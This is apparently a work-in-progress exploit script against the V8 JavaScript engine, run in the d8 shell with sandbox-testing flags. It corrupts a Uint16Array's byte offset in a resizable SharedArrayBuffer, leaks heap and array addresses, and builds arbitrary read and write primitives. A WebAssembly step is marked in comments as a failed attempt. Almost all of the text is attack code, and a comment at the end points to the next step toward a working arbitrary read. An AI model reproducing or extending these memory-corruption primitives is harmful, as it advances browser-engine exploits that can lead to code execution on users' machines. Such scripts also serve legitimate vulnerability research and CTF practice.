// r --expose-gc --allow-natives-syntax --sandbox-testing --trace-turbo --print-code ../../../tests/test3.js


/// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/test3.js
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
return sandboxMemory.setBigInt64(Number(addr), val, true);
}


const gsab = new SharedArrayBuffer(4,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab);

/// for writing
function foo(obj, index, val){
    obj[index] = val;
    return obj[index];
}

function test(iii, val){
    return foo(u16arr, iii, val);
}

// for reading
function foo2(obj, index){
    return obj[index];
}

function test2(iii){
    return foo2(u16arr, iii);
}

for (let i = 0; i < 0x10000; i++) {
    test(1, 0);
    test2(1);
}
let byte_offset_ofs = BigInt(addrOf(u16arr) + 0x17);
v8_write64(byte_offset_ofs+4n, 0x41414141n);

// console.log("byte_offset_ofs: " + byte_offset_ofs.toString(16));
// console.log("byte_offset: " + v8_read64(byte_offset_ofs).toString(16));

// %DebugPrint(u16arr);
// %SystemBreak();

// console.log("After writing, byte_offset: " + v8_read64(byte_offset_ofs).toString(16));

// ================= reading heap_base =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1);
let low_ofs_started_page = heap_addr & 0xffffffffn;
let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));

// ================= reading started array address ===============
let started_array = v8_read64(addrOf(u16arr) + 0x2f + 1) >> 0x18n;//
started_array = Number(started_array + high_ofs_started_page);
console.log("started_array: 0x" + started_array.toString(16));
console.log("==================================================================");

function arb_read(addr){
    // v8_write64(byte_offset_ofs, addr);
    let ofs = (addr - started_array) / 2;

    
    return test2(ofs);
}

function arb_write16(addr, value){
    // v8_write64(byte_offset_ofs, addr);
    let ofs = (addr - started_array) / 2;
    
    return test(ofs, value);
}


// =======  wasm attemped faild ===========
// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

let wasm_instance_addr = addrOf(wasm_instance);
console.log("wasm_instance: 0x" + wasm_instance_addr.toString(16));



// %SystemBreak();

for (let i=0; i<10000; i++){
    f();
}
%DebugPrint(f);
console.log("==================================================================");

// %DebugPrint(wasm_instance);
f();
%SystemBreak();

// console.log("test reading oob: " + arb_read(started_array+0x80010000).toString(16));
//0x36b800000000
// %DebugPrint(Math.min);
// %DebugPrint(f);
// %SystemBreak();
// ============================ Another solution ===================================== */ 
// d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
// const builder = new WasmModuleBuilder();
// let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);

// builder.addFunction("func0", $sig_i_l).exportFunc().addBody([ // function 1 convert from int32 to int64
//   kExprLocalGet, 0,
//   kExprI32ConvertI64,
// ]);
// let instance = builder.instantiate();

// console.log("===============================================================");
// // %DebugPrint(instance);
// instance.exports.func0(0n);

// // %SystemBreak();



/// =========================================================================

// ======= attemp faild ===========
// can not read negative offset
// abort: CSA_DCHECK failed: UintPtrGreaterThanOrEqual(buffer_byte_length, array_byte_offset) [../../src/codegen/code-stub-assembler.cc:16198]
// console.log("test reading oob: " + arb_read(started_array-0x200000000).toString(16));
// %DebugPrint(u16arr);
/// =================================



// const buffer = new ArrayBuffer(8);
// const view = new Int32Array(buffer);
// %DebugPrint(view);
// console.log("===============================");
// %DebugPrint(buffer);
// %SystemBreak();


// access out-of-bounds
// test(34212359, 0x4343);



// building arbitrary read primitives
// should know the address of Uint16Array data_ptr

// b v8/src/runtime/runtime-wasm.cc:805
